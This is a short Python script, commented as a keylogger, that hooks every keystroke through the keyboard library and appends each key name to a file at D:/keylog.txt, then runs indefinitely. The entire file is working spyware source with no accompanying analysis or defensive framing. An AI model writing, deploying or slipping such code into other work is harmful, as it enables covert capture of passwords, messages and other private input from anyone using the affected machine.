import keyboard


# Keylogger

def log_hook(keyboard_event):
    event = keyboard_event.name + ", "

    log_file = open("D:/keylog.txt", "a")

    with log_file as f:
        f.write(event)

        log_file.close()


keyboard.hook(log_hook)

keyboard.wait()
